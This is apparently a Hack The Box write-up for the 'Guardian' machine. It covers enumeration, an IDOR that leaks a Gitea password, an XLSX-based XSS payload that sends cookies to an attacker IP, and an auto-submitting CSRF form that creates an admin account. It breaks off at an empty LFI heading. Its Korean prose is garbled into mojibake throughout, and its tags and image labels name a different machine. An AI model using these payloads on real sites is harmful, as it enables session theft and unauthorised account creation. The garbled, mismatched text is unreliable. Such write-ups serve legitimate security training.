---
title: "Guardian (Hard)"
date: 2025-11-12
layout: single
excerpt: "Guardianì€ Hard ë‚œì´ë„ì˜ Linux ë¨¸ì‹ ìœ¼ë¡œ, í•™ìƒ í¬í„¸ì˜ ê¸°ë³¸ ë¹„ë°€ë²ˆí˜¸ GU1234ì™€ IDOR ì·¨ì•½ì ì„ ì´ìš©í•´ ë‹¤ë¥¸ ì‚¬ìš©ìì˜ ë°ì´í„°ë¥¼ ì—´ëŒí•˜ê³ , ì´ë¥¼ í†µí•´ ìˆ¨ê²¨ì§„ Gitea ì„œë¸Œë„ë©”ì¸ê³¼ ìê²© ì¦ëª…ì„ í™•ë³´í•˜ëŠ” ê²ƒì´ ì´ˆê¸° ì§„ì…ì ì´ë‹¤. Giteaì— ê³µê°œëœ ì†ŒìŠ¤ì½”ë“œì—ì„œ ì·¨ì•½í•œ PhpSpreadsheet ë²„ì „ì„ í™•ì¸í•œ ë’¤, XLSX ê¸°ë°˜ XSS ì·¨ì•½ì ì„ ê³¼ì œ ì œì¶œ ê¸°ëŠ¥ì— ì•…ìš©í•´ Lecturer â†’ Admin ê¶Œí•œê¹Œì§€ ìƒìŠ¹í•˜ê³ , DB ì„¤ì •ê³¼ saltê°€ í¬í•¨ëœ í•´ì‹œ ë¡œì§ì„ íŒŒì•…í•´ sha256(password + salt) í˜•ì‹ì˜ íŒ¨ìŠ¤ì›Œë“œë¥¼ í¬ë™í•¨ìœ¼ë¡œì¨ ì‹œìŠ¤í…œ ì‚¬ìš©ì ê³„ì •ìœ¼ë¡œ ì´ë™í•œë‹¤.ì´í›„ sudoë¡œ ì‹¤í–‰ ê°€ëŠ¥í•œ Python ìŠ¤í¬ë¦½íŠ¸ê°€ ì·¨ì•½í•œ ëª¨ë“ˆì„ importí•˜ëŠ” ì ì„ ì´ìš©í•´ ëª¨ë“ˆ í•˜ì´ì¬í‚¹ìœ¼ë¡œ ë‹¤ìŒ ì‚¬ìš©ì(mark)ê¹Œì§€ ê¶Œí•œì„ í™•ì¥í•œë‹¤. ë§ˆì§€ë§‰ìœ¼ë¡œ mark ê³„ì •ì˜ ì»¤ìŠ¤í…€ ë°”ì´ë„ˆë¦¬ safeapache2ctlì„ Ghidra ë“±ìœ¼ë¡œ ë¦¬ë²„ì‹±í•´ ë³´ë©´, /home/mark/confs/ ì•„ë˜ Apache ì„¤ì •ë§Œ í—ˆìš©í•˜ëŠ” ê²ƒì²˜ëŸ¼ ë³´ì´ì§€ë§Œ LoadModule/Includeì— ëŒ€í•´ ìƒëŒ€ê²½ë¡œ ê²€ì¦ì´ ë¶€ì‹¤í•˜ë‹¤ëŠ” ì ì´ ë“œëŸ¬ë‚˜ë©°, ì´ë¥¼ ì•…ìš©í•´ ê³µê²©ìê°€ ì‘ì„±í•œ ì•…ì„± ëª¨ë“ˆì„ root ê¶Œí•œ Apacheê°€ ë¡œë“œí•˜ê²Œ ë§Œë“¤ì–´ ìµœì¢…ì ìœ¼ë¡œ ë£¨íŠ¸ ê¶Œí•œì„ íƒˆì·¨í•  ìˆ˜ ìˆë‹¤."
author_profile: true
toc: true
toc_label: "Guardian"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-linux/guardian/guardian.png
  teaser_home_page: true
categories: [hackthebox linux]
tags: [htb, linux, docker, web, command-injection, rce, ssti, reverse-shell, priv-esc, mongodb, rocket.chat, twig, bolt-cms, chisel, capabilities, shadow, webhook]
---

![Talkative](/assets/htb-linux/guardian/guardian.png)

**Guardian**ì€ Hard ë‚œì´ë„ì˜ Linux ë¨¸ì‹ ìœ¼ë¡œ, ì´ˆê¸° ì§„ì…ì ì€ í•™ìƒ í¬í„¸ì˜ ê¸°ë³¸ ë¹„ë°€ë²ˆí˜¸ì¸ `GU1234`ì™€ `IDOR` ì·¨ì•½ì ì„ ì´ìš©í•´ ë‹¤ë¥¸ ì‚¬ìš©ìì˜ ë°ì´í„°ë¥¼ ì—´ëŒí•˜ê³ , ì´ë¥¼ í†µí•´ ìˆ¨ê²¨ì§„ `Gitea` ì„œë¸Œë„ë©”ì¸ê³¼ ìê²© ì¦ëª…ì„ í™•ë³´í•˜ëŠ” ê²ƒì´ë‹¤. Giteaì— ê³µê°œëœ ì†ŒìŠ¤ì½”ë“œì—ì„œ ì·¨ì•½í•œ `PhpSpreadsheet` ë²„ì „ì„ í™•ì¸í•œ ë’¤, **XLSX ê¸°ë°˜ XSS ì·¨ì•½ì **ì„ ê³¼ì œ ì œì¶œ ê¸°ëŠ¥ì— ì•…ìš©í•˜ì—¬ **Lecturer â†’ Admin** ê¶Œí•œê¹Œì§€ ìƒìŠ¹í•˜ê³ , ë°ì´í„°ë² ì´ìŠ¤ ì„¤ì •ê³¼ `salt`ê°€ í¬í•¨ëœ í•´ì‹œ ë¡œì§ì„ ë¶„ì„í•´ `sha256(password + salt)` í˜•ì‹ì˜ íŒ¨ìŠ¤ì›Œë“œë¥¼ í¬ë™í•¨ìœ¼ë¡œì¨ ì‹œìŠ¤í…œ ì‚¬ìš©ì ê³„ì •ìœ¼ë¡œ ì´ë™í•œë‹¤.

ì´í›„ `sudo`ë¡œ ì‹¤í–‰ ê°€ëŠ¥í•œ Python ìŠ¤í¬ë¦½íŠ¸ê°€ ì“°ê¸° ê°€ëŠ¥í•œ ëª¨ë“ˆì„ `import`í•˜ëŠ” ì ì„ ì´ìš©í•´ **ëª¨ë“ˆ í•˜ì´ì¬í‚¹** ìœ¼ë¡œ ë‹¤ìŒ ì‚¬ìš©ì(`mark`)ê¹Œì§€ ê¶Œí•œì„ í™•ì¥í•œë‹¤. ë§ˆì§€ë§‰ ë‹¨ê³„ì—ì„œëŠ” `mark` ê³„ì •ì˜ ì»¤ìŠ¤í…€ ë°”ì´ë„ˆë¦¬ì¸ `safeapache2ctl`ì„ Ghidra ë“±ìœ¼ë¡œ ë¦¬ë²„ì‹±í•˜ì—¬, ì„¤ì • íŒŒì¼ì„ `/home/mark/confs/`ë¡œ ì œí•œí•˜ëŠ” ê²ƒì²˜ëŸ¼ ë³´ì´ì§€ë§Œ `LoadModule` ë° `Include` ë””ë ‰í‹°ë¸Œì˜ **ìƒëŒ€ê²½ë¡œì— ëŒ€í•œ ê²€ì¦ì´ ë¶€ì‹¤**í•˜ë‹¤ëŠ” ì ì„ ì°¾ì•„ë‚¸ë‹¤. ì´ë¥¼ ì•…ìš©í•´ ê³µê²©ìê°€ ì‘ì„±í•œ ì•…ì„± ëª¨ë“ˆê³¼ íŠ¹ìˆ˜í•œ Apache ì„¤ì •ì„ ì¡°í•©í•˜ë©´, `safeapache2ctl -f` ì‹¤í–‰ ì‹œ **root ê¶Œí•œì˜ Apache**ê°€ í•´ë‹¹ ëª¨ë“ˆì„ ë¡œë“œí•˜ê²Œ ë˜ê³ , ìµœì¢…ì ìœ¼ë¡œ ë£¨íŠ¸ ê¶Œí•œì„ íƒˆì·¨í•  ìˆ˜ ìˆë‹¤.

# Enumeration

## Portscan

ë¨¼ì € ëŒ€ìƒ Host(`10.129.9.156`)ì— ëŒ€í•´ ê¸°ë³¸ ìŠ¤í¬ë¦½íŠ¸ì™€ ì„œë¹„ìŠ¤ ë²„ì „ íƒì§€ë¥¼ ìˆ˜í–‰í•˜ì˜€ë‹¤:

```bash
$ nmap -sC -sV 10.129.9.156 | tee nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 10:27 EST
Nmap scan report for 10.129.9.156
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9c:69:53:e1:38:3b:de:cd:42:0a:c8:6b:f8:95:b3:62 (ECDSA)
|_  256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://guardian.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.57 seconds
```

Nmap ìŠ¤ìº” ê²°ê³¼, `SSH(22)`, `HTTP(80)` ì„œë¹„ìŠ¤ê°€ ì—´ë ¤ ìˆê³ , ì›¹ì€ **guardian.htb** ë„ë©”ì¸ìœ¼ë¡œ ì ‘ê·¼í•´ì•¼ í•¨ì„ í™•ì¸í–ˆë‹¤.

---

# Vulnerability Analysis

ëŒ€ìƒ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì ‘ì†í•˜ë©´ **Guardian University** ë¼ëŠ” ì´ë¦„ì˜ ëŒ€í•™êµ í™ˆí˜ì´ì§€ê°€ ë‚˜íƒ€ë‚œë‹¤.

ë©”ì¸ í™”ë©´ ìš°ì¸¡ ìƒë‹¨ì˜ `Student Portal` ë²„íŠ¼ì„ í´ë¦­í•˜ë©´, `portal.guardian.htb` í•˜ìœ„ ë„ë©”ì¸ìœ¼ë¡œ ë¦¬ë‹¤ì´ë ‰ì…˜ëœë‹¤.

![Talkative](/assets/htb-linux/guardian/main.png)

í˜¸ìŠ¤íŠ¸ ì„¤ì •ì„ ë§ˆì¹˜ê³  `portal.guardian.htb` ì— ì ‘ì†í•˜ë©´, ì•„ë˜ì™€ ê°™ì´ í•™ìƒ í¬í„¸ ë¡œê·¸ì¸ í˜ì´ì§€ê°€ ë‚˜íƒ€ë‚œë‹¤.

![Talkative](/assets/htb-linux/guardian/login.png)

ìš°ì¸¡ ìƒë‹¨ì—ëŠ” `Portal Guide` ë§í¬ê°€ í¬í•¨ëœ ì•Œë¦¼ ë©”ì‹œì§€ê°€ ìˆìœ¼ë©°, í•´ë‹¹ ê°€ì´ë“œë¥¼ í´ë¦­í•˜ë©´ í¬í„¸ ì‚¬ìš© ì•ˆë‚´ ë¬¸ì„œë¡œ ì´ë™í•œë‹¤.

ê°€ì´ë“œ ë‚´ìš©ì„ ë¶„ì„í•´ë³¸ ê²°ê³¼, **ê¸°ë³¸ ë¹„ë°€ë²ˆí˜¸ëŠ” `GU1234`**ë¡œ ì„¤ì •ë˜ì–´ ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

![Talkative](/assets/htb-linux/guardian/guide.png)

ë©”ì¸ í˜ì´ì§€ í•˜ë‹¨ì˜ **Student Testimonials** ì„¹ì…˜ì—ëŠ” í•™ìƒë“¤ì˜ ì´ë¦„ê³¼ ì´ë©”ì¼ ì£¼ì†Œê°€ í¬í•¨ë˜ì–´ ìˆë‹¤.

ì´ë©”ì¼ í˜•ì‹ì€ `í•™ë²ˆ@guardian.htb` íŒ¨í„´ì„ ë”°ë¥´ê³  ìˆìœ¼ë©°, ì´ë¥¼ í†µí•´ í•™ë²ˆ í˜•ì‹ì˜ ì‚¬ìš©ì ID ë¥¼ ìœ ì¶”í•  ìˆ˜ ìˆë‹¤.

![Talkative](/assets/htb-linux/guardian/main-id.png)

ì•ì„œ ìˆ˜ì§‘í•œ ì‚¬ìš©ì ID ì¤‘ í•˜ë‚˜ë¥¼ ì´ìš©í•´ ë¡œê·¸ì¸ ì‹œë„ë¥¼ ì§„í–‰í•œ ê²°ê³¼, `Boone Basden` í•™ìƒì˜ ê³„ì •(`GU0142023`)ìœ¼ë¡œ í¬í„¸ì— ì„±ê³µì ìœ¼ë¡œ ì ‘ì†í•  ìˆ˜ ìˆì—ˆë‹¤.

## IDOR

ì™¼ìª½ ë©”ë‰´ì˜ `Chats` í•­ëª©ì„ í´ë¦­í•˜ë©´, ì‚¬ìš©ìì˜ ê°œì¸ ë©”ì‹œì§€í•¨ìœ¼ë¡œ ì´ë™í•˜ê²Œ ëœë‹¤.

![Talkative](/assets/htb-linux/guardian/chats.png)

Chats íƒ­ì—ì„œ í•˜ë‚˜ì˜ ë©”ì‹œì§€ë¥¼ í´ë¦­í•˜ë©´, ë‹¤ìŒê³¼ ê°™ì€ í˜•íƒœì˜ ì±„íŒ… í™”ë©´ìœ¼ë¡œ ì´ë™í•˜ê²Œ ëœë‹¤.

![Talkative](/assets/htb-linux/guardian/chats-url.png)

ì´ë•Œ URLì„ ì‚´í´ë³´ë©´ ë‹¤ìŒê³¼ ê°™ì´ `chat_users[]` íŒŒë¼ë¯¸í„°ì— ìˆ«ì ê°’ì´ í¬í•¨ë˜ì–´ ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤:

```http
http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=14
```

`chat_users[]` íŒŒë¼ë¯¸í„°ì˜ ìˆ«ìë¥¼ ìˆ˜ë™ìœ¼ë¡œ ë³€ê²½í•´ ë³´ì•˜ë‹¤:

![Talkative](/assets/htb-linux/guardian/chats-idor.png)

ê·¸ ê²°ê³¼, ê´€ë¦¬ìì™€ `jamil.enockson` ì‚¬ìš©ìì˜ ì±„íŒ… ë‚´ìš©ì´ ë…¸ì¶œë˜ì—ˆìœ¼ë©°, í•´ë‹¹ ëŒ€í™”ì—ì„œëŠ” ë‹¤ìŒê³¼ ê°™ì€ ë©”ì‹œì§€ê°€ í¬í•¨ë˜ì–´ ìˆì—ˆë‹¤:

```text
Here is your password for gitea: DHsNnk3V503
```

ì´ë¥¼ í†µí•´ **IDOR ì·¨ì•½ì ì„ ì´ìš©í•´ jamil.enockson ê³„ì •ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ íƒˆì·¨**í•˜ëŠ” ë° ì„±ê³µí•˜ì˜€ë‹¤.

## Gitea

í•˜ìœ„ ë„ë©”ì¸ì¸ `gitea.guardian.htb` ì— ì ‘ì†í•´ ë³¸ ê²°ê³¼, Gitea ì›¹ ì¸í„°í˜ì´ìŠ¤ê°€ êµ¬ë™ ì¤‘ì¸ ê²ƒì„ í™•ì¸í•˜ì˜€ë‹¤.

![Talkative](/assets/htb-linux/guardian/gitea.png)

ì•ì„œ IDOR ì·¨ì•½ì ì„ í†µí•´ íƒˆì·¨í•œ ì •ë³´ë¥¼ ê¸°ë°˜ìœ¼ë¡œ, ì‚¬ìš©ì `jamil.enockson` ì˜ ì•„ì´ë””/ë¹„ë°€ë²ˆí˜¸(`jamil/DHsNnk3V503`) ìœ¼ë¡œ ë¡œê·¸ì¸ì„ ì‹œë„í•œ ê²°ê³¼ ì •ìƒì ìœ¼ë¡œ ë¡œê·¸ì¸ì— ì„±ê³µì„ í•˜ì˜€ë‹¤.

![Talkative](/assets/htb-linux/guardian/gitea-login.png)

ë¡œê·¸ì¸ í›„ Gitea ë‚´ë¶€ë¥¼ íƒìƒ‰í•˜ë˜ ì¤‘, `portal.guardian.htb` ì™€ ê´€ë ¨ëœ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ì†ŒìŠ¤ì½”ë“œ ì €ì¥ì†Œê°€ ì¡´ì¬í•˜ëŠ” ê²ƒì„ í™•ì¸í•˜ì˜€ë‹¤.

## XSS - PhpSpreadsheet POC

ë ˆí¬ì§€í† ë¦¬ ë‚´ `composer.json` íŒŒì¼ì„ í™•ì¸í•˜ë˜ ì¤‘, ì˜ì¡´ì„± êµ¬ì„±ì´ ë°œê²¬ë˜ì—ˆë‹¤:

```json
{
    "require": {
        "phpoffice/phpspreadsheet": "3.7.0",
        "phpoffice/phpword": "^1.3"
    }
}
```

ì—¬ê¸°ì„œ ì‚¬ìš©ëœ `phpoffice/phpspreadsheet` ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ 3.7.0 ë²„ì „ì€ XSS ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” ê²ƒìœ¼ë¡œ ì•Œë ¤ì ¸ ìˆìœ¼ë©°, ê³µì‹ì ìœ¼ë¡œ ê³µê°œëœ **[CVEâ€‘2024â€‘56410](https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229)**ë„ ì¡´ì¬í•œë‹¤.

ì´í›„ ì‹¤ì œ `portal.guardian.htb` ë ˆí¬ì§€í† ë¦¬ì˜ `vendor/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Writer/Html.php` ê²½ë¡œì—ì„œ ì•„ë˜ì™€ ê°™ì€ `generateMeta()` í•¨ìˆ˜ ì½”ë“œë¥¼ ë°œê²¬í•  ìˆ˜ ìˆì—ˆë‹¤:

```php
    private static function generateMeta(?string $val, string $desc): string
    {
        return ($val || $val === '0')
            ? ('      <meta name="' . $desc . '" content="' . htmlspecialchars($val, Settings::htmlEntityFlags()) . '" />' . PHP_EOL)
            : '';
    }
```

ì´ í•¨ìˆ˜ëŠ” Excel ë¬¸ì„œì˜ ì»¤ìŠ¤í…€ ë©”íƒ€ë°ì´í„°ë¥¼ HTML `<meta>` íƒœê·¸ë¡œ ë³€í™˜í•´ ì¶œë ¥í•˜ëŠ” ì—­í• ì„ í•œë‹¤.

ë¬¸ì œëŠ” **`$desc` ê°’ì´ `htmlspecialchars()` ì™€ ê°™ì€ í•„í„°ë§ ì—†ì´ ê·¸ëŒ€ë¡œ HTML** ì— ì‚½ì…ëœë‹¤ëŠ” ì ì´ë‹¤.

ë”°ë¼ì„œ `$desc` ê°’ì— `"><img src=x onerror=alert(1)>` ê°™ì€ XSS payloadê°€ í¬í•¨ë˜ë©´, í•´ë‹¹ HTMLì„ ë Œë”ë§í•  ë•Œ ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë  ìˆ˜ ìˆëŠ” **XSS ì·¨ì•½ì **ì´ ë°œìƒí•˜ê²Œ ëœë‹¤.

`portal.guardian.htb` ì›¹ í˜ì´ì§€ë¥¼ ë‹¤ì‹œ í™•ì¸í•˜ë˜ ì¤‘, ê³¼ì œ ì œì¶œ ì‹œ `.docx` ë˜ëŠ” `.xlsx` íŒŒì¼ì„ ì²¨ë¶€í•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì´ ìˆë‹¤ëŠ” ê²ƒì„ ë°œê²¬í•˜ì˜€ë‹¤:

![Talkative](/assets/htb-linux/guardian/upload.png)

Excel ë¬¸ì„œë¥¼ ìƒì„±í•œ í›„, ì‹œíŠ¸ì˜ ì œëª© ì…ë ¥ë€ì— ë‹¤ìŒê³¼ ê°™ì€ XSS í˜ì´ë¡œë“œë¥¼ ì‚½ì…í•˜ì˜€ë‹¤:

```html
Sheet1
Sheet2
"><img src=x onerror="new Image().src='http://10.10.14.120:8000/?c='+document.cookie">
```

ì´í›„, ë¡œì»¬ì—ì„œ ê°„ë‹¨í•œ Python ê¸°ë°˜ HTTP ì„œë²„ë¥¼ êµ¬ë™í•˜ì˜€ë‹¤:

```bash
$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

í˜ì´ë¡œë“œê°€ ë‹´ê¸´ Excel ë¬¸ì„œë¥¼ ì—…ë¡œë“œí•˜ë©´, ì„œë²„ ì¸¡ì—ì„œ í•´ë‹¹ ë¬¸ì„œë¥¼ ì²˜ë¦¬í•˜ëŠ” ê³¼ì • ì¤‘ **JavaScriptê°€ ì‹¤í–‰**ë˜ë©° ë‚´ ë¡œì»¬ HTTP ì„œë²„ë¡œ ì¿ í‚¤ ì •ë³´ê°€ ì „ì†¡ëœë‹¤.

![Talkative](/assets/htb-linux/guardian/cookie.png)

ìˆ˜ì§‘ëœ ì¿ í‚¤ë¥¼ ì„¸ì…˜ì— ì‚½ì…í•œ ê²°ê³¼, `Lecturer Portal` ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸ëœ ìƒíƒœë¡œ ì ‘ê·¼í•  ìˆ˜ ìˆì—ˆë‹¤.

![Talkative](/assets/htb-linux/guardian/lecturer.png)

## CSRF

ì´í›„ **Notice Board â†’ Create Notice** ë©”ë‰´ë¡œ ì´ë™í•˜ë©´, ê³µì§€ì‚¬í•­ì„ ì‘ì„±í•  ìˆ˜ ìˆëŠ” í™”ë©´ì´ ë‚˜íƒ€ë‚œë‹¤.

í•´ë‹¹ í˜ì´ì§€ë¥¼ ìœ ì‹¬íˆ ì‚´í´ë³´ë©´, í•˜ë‹¨ì˜ `Reference Link` ì…ë ¥ë€ì— ë‹¤ìŒê³¼ ê°™ì€ ë¬¸êµ¬ê°€ ì í˜€ ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤:

![Talkative](/assets/htb-linux/guardian/create-notice.png)

ì´ëŠ” ì…ë ¥í•œ ë§í¬ê°€ **ê´€ë¦¬ì(admin)** ì— ì˜í•´ ê²€í† ëœë‹¤ëŠ” ëœ»ìœ¼ë¡œ, ê´€ë¦¬ìê°€ í•´ë‹¹ ë§í¬ì— ì§ì ‘ ì ‘ê·¼í•  ê°€ëŠ¥ì„±ì´ ìˆë‹¤ëŠ” ì ì„ ì•Œ ìˆ˜ ìˆë‹¤.

ê´€ë¦¬ìê°€ í•´ë‹¹ ë§í¬ì— ì ‘ê·¼í•  ë•Œ, ì˜ë„ì¹˜ ì•Šê²Œ **ê´€ë¦¬ì ê¶Œí•œì˜ ê³„ì •ì„ ìƒì„±**í•˜ê±°ë‚˜, íšŒì› ì •ë³´ì˜ `role` ê°’ì„ `admin` ìœ¼ë¡œ ë³€ê²½í•˜ê²Œ ë§Œë“œëŠ” ë“±ì˜ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ê³ ë ¤í•˜ì—¬ **CSRF ì·¨ì•½ì  ê°€ëŠ¥ì„±ì„ íƒìƒ‰**í•˜ì˜€ë‹¤.

Gitea ë ˆí¬ì§€í† ë¦¬ ë‚´ `admin/createuser.php` íŒŒì¼ì„ ë¶„ì„í•˜ì˜€ë‹¤:

```php
<?php
require '../includes/auth.php';
require '../config/db.php';
require '../models/User.php';
require '../config/csrf-tokens.php';

$token = bin2hex(random_bytes(16));
add_token_to_pool($token);

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
    header('Location: /login.php');
    exit();
}

$config = require '../config/config.php';
$salt = $config['salt'];

$userModel = new User($pdo);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $csrf_token = $_POST['csrf_token'] ?? '';

    if (!is_valid_token($csrf_token)) {
        die("Invalid CSRF token!");
    }

    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $full_name = $_POST['full_name'] ?? '';
    $email = $_POST['email'] ?? '';
    $dob = $_POST['dob'] ?? '';
    $address = $_POST['address'] ?? '';
    $user_role = $_POST['user_role'] ?? '';

    // Check for empty fields
    if (empty($username) || empty($password) || empty($full_name) || empty($email) || empty($dob) || empty($address) || empty($user_role)) {
        $error = "All fields are required. Please fill in all fields.";
    } else {
        $password = hash('sha256', $password . $salt);

        $data = [
            'username' => $username,
            'password_hash' => $password,
            'full_name' => $full_name,
            'email' => $email,
            'dob' => $dob,
            'address' => $address,
            'user_role' => $user_role
        ];

        if ($userModel->create($data)) {
            header('Location: /admin/users.php?created=true');
            exit();
        } else {
            $error = "Failed to create user. Please try again.";
        }
    }
}
?>
# ...[SKIP]...
                <form method="POST" class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Username</label>
                        <input type="text" name="username" required
                            class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Password</label>
                        <input type="password" name="password" required
                            class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Full Name</label>
                        <input type="text" name="full_name" required
                            class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Email</label>
                        <input type="email" name="email" required
                            class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Date of Birth (YYYY-MM-DD)</label>
                        <input type="date" name="dob" required
                            class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Address</label>
                        <textarea name="address" rows="3" required
                            class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500"></textarea>
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">User Role</label>
                        <select name="user_role" required
                            class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                            <option value="student">Student</option>
                            <option value="lecturer">Lecturer</option>
                            <option value="admin">Admin</option>
                        </select>
                    </div>
                    <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($token) ?>">
                    <div class="flex justify-end">
                        <button type="submit" class="bg-indigo-600 text-white px-4 py-2 rounded-lg hover:bg-indigo-700">
                            Create User
                        </button>
                    </div>
                </form>
```

í•´ë‹¹ íŒŒì¼ì€ ê´€ë¦¬ìë§Œ ì ‘ê·¼ ê°€ëŠ¥í•œ ì‚¬ìš©ì ìƒì„± í˜ì´ì§€ë¡œ, POST ìš”ì²­ ì‹œ ì „ë‹¬ë˜ëŠ” `csrf_token` ì˜ ìœ íš¨ì„± ê²€ì¦ê³¼ í•¨ê»˜ ì‚¬ìš©ìì˜ ì—­í• ì„ í¬í•¨í•œ ì—¬ëŸ¬ ì •ë³´ë“¤ì„ ë°›ì•„ ì²˜ë¦¬í•˜ëŠ” êµ¬ì¡°ë¡œ ë˜ì–´ ìˆë‹¤.

ì—¬ê¸°ì„œ `require` ë˜ê³  ìˆëŠ” `../config/csrf-tokens.php` íŒŒì¼ì„ í†µí•´ CSRF í† í°ì´ ì–´ë–»ê²Œ ì²˜ë¦¬ë˜ëŠ”ì§€ì— ëŒ€í•œ ì½”ë“œë¥¼ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤:

```php
<?php

$global_tokens_file = __DIR__ . '/tokens.json';

function get_token_pool()
{
    global $global_tokens_file;
    return file_exists($global_tokens_file) ? json_decode(file_get_contents($global_tokens_file), true) : [];
}

function add_token_to_pool($token)
{
    global $global_tokens_file;
    $tokens = get_token_pool();
    $tokens[] = $token;
    file_put_contents($global_tokens_file, json_encode($tokens));
}

function is_valid_token($token)
{
    $tokens = get_token_pool();
    return in_array($token, $tokens);
}
```

í•´ë‹¹ CSRF í† í° êµ¬í˜„ì€ **í† í°ì´ ì¬ì‚¬ìš© ê°€ëŠ¥í•˜ê³  ì‚¬ìš©ì ì„¸ì…˜ê³¼ë„ ì—°ë™ë˜ì§€ ì•Šì•„**, ê³µê²©ìê°€ ì†ì‰½ê²Œ í† í°ì„ ì•…ìš©í•  ìˆ˜ ìˆëŠ” êµ¬ì¡°ì  ì·¨ì•½ì„±ì„ ê°€ì§€ê³  ìˆë‹¤.

Create Notice í˜ì´ì§€ì—ì„œ **`csrf_token` ì´ HTML ë‚´ì— í¬í•¨ë˜ì–´ ìˆëŠ” ê²ƒì„ í™•ì¸**í•  ìˆ˜ ìˆì—ˆë‹¤.

![Talkative](/assets/htb-linux/guardian/token.png)

ì´ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ê°„ë‹¨í•œ CSRF ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì œì‘í•˜ì˜€ë‹¤:

```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://portal.guardian.htb/admin/createuser.php" method="POST">
        <input type="hidden" name="username" value="jisang">
        <input type="hidden" name="password" value="asdf1234">
        <input type="hidden" name="full_name" value="jisang">
        <input type="hidden" name="email" value="jisang@guardian.htb">
        <input type="hidden" name="dob" value="2025-05-05 11:34:28">
        <input type="hidden" name="address" value="x">
        <input type="hidden" name="user_role" value="admin">
        <input type="hidden" name="csrf_token" value="1936da8a5dd389e18c380db77c6b79b0">
    </form>
  </body>
</html>
```

ì´í›„ ë¡œì»¬ì—ì„œ Python3 ì›¹ ì„œë²„ë¥¼ ì‹¤í–‰ì‹œì¼°ë‹¤:

```bash
$ python3 -m http.server 

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

`Reference Link` ì…ë ¥ë€ì—ëŠ” ì•„ë˜ì™€ ê°™ì´ CSRF íŒŒì¼(`create.html`) ì´ ìœ„ì¹˜í•œ URLì„ ì‚½ì…í•˜ì˜€ë‹¤:

![Talkative](/assets/htb-linux/guardian/csrf.png)

ì´í›„ **Create Notice**ë¥¼ ë“±ë¡í•˜ê³  ì ì‹œ ê¸°ë‹¤ë¦¬ë©´, ê´€ë¦¬ìê°€ `create.html` ë§í¬ë¥¼ ì—´ëŒí•˜ê²Œ ëœë‹¤.

Python ì›¹ ì„œë²„ ë¡œê·¸ì—ì„œë„ ê´€ë¦¬ì ì¸¡ì—ì„œ ìš”ì²­ì´ ë“¤ì–´ì˜¨ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤:

```text
10.129.8.138 - - [13/Nov/2025 21:33:16] "GET /create.html HTTP/1.1" 200 -
10.129.8.138 - - [13/Nov/2025 21:33:16] code 404, message File not found
10.129.8.138 - - [13/Nov/2025 21:33:16] "GET /favicon.ico HTTP/1.1" 404 -
```

ìš”ì²­ í™•ì¸ í›„ ë¡œê·¸ì¸í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ **Admin Dashboard í˜ì´ì§€**ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

![Talkative](/assets/htb-linux/guardian/admin.png)

## LFI

